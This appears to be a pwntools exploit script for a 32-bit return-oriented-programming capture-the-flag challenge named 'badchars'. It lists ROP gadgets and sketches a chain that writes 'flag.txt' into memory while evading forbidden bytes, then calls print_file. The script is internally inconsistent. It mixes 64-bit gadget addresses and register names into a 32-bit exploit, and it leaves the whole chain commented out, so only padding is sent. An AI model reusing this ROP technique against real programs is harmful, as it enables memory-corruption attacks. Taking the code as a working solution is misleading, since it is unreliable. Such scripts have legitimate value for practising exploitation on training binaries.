from pwn import *

p = process("./badchars")
lib = ELF("./libbadchars.so")
exe = ELF("./badchars")

# a list of useful gadgets:
# (found these via /gR/ xor)
#   0x08048547             305d00  xor byte [ebp], bl
#   0x0804854a                 c3  ret
# 
#   0x080485d6                 5b  pop ebx
#   0x080485d7                 c3  ret
#   
#   0x0804854b             285d00  sub byte [ebp], bl
#   0x0804854e                 c3  ret
# 
# (found this one via /gR/ mov dword \[e..\], e..)
#   0x0804854f               8937  mov dword [edi], esi
#   0x08048551                 c3  ret
# 
# (found this one via /gR pop esi)
#   0x080485b9                 5e  pop esi
#   0x080485ba                 5f  pop edi
#   0x080485bb                 5d  pop ebp
#   0x080485bc                 c3  ret
# 
# restricted bytes:
#   [0x08048506]> pxw 4 @ twil.badcharacters
#   0xf7fb9878  0x2e616778                                   xga.
# 
# dest: 0x0804a018
# 
# luckily our return addresses don't have any of the badchars...
# so HOPEFULLY, our ROPchain is trivial, spoiler: it was



# we basically want tgt char to be represented
# in the form a ^ b and somehow load those payload wise
# we only really need to xor the badchars though
# so we can write fl + first_xor(a) + first_xor(b) + first_xor(.) + t + first_xor(x) + t
# or since we just have a sub gadget let's just do a +1 to every badchar
# how bad could it be I mean?

def add_one_to_bad(paulod, badchars) -> bytes:
    _ = b''
    for i in paulod:
        if i in badchars:
            _ += chr(i+1).encode('utf-8')
        else:
            _ += chr(i).encode('utf-8')
    return _
    

# prelude
offset = 0x2c
dest = 0x0804a018

# gadgets
write_r12_to_r13 = 0x00400634
sub_r14_from_r15 = 0x00400630
pop_ebx = 0x080485d6
pop_r12_to_r15 = 0x0040069c
pop_ebp = 0x080485bb

# strings
write1 = b'flag'
write2 = b'.txt'
badchars = b'xga.'

write1 = add_one_to_bad(write1, badchars)
write2 = add_one_to_bad(write2, badchars)

# target_funcs
print_file = 0x080483d0

# final payload
# write to .data -> sub 1s and correct -> call print_file
payload = b"E" * offset

# write first half
# payload += p64(pop_esi_edi_ebp)
# payload += write1 + p64(dest) + p64(dest+2)
# payload += p64(write_esi_to_edi)
# 
# # correct first half
# payload += p32(pop_ebx) + p32(0x1)
# payload += p32(sub_bl_from_ebp)
# payload += p32(pop_ebp) + p32(dest+3) + p32(sub_bl_from_ebp)
# 
# # write second half
# payload += p32(pop_esi_edi_ebp)
# payload += write2 + (p32(dest+4) * 2)
# payload += p32(write_esi_to_edi)
# 
# # correct second half
# payload += p32(sub_bl_from_ebp)
# payload += p32(pop_ebp) + p32(dest+6) + p32(sub_bl_from_ebp)
# 
# # function call
# payload += p32(print_file)
# payload += p32(0xdeadba5e) + p32(dest)

with open('payload.bin', 'wb') as f:
    f.write(payload)

p.sendline(payload)
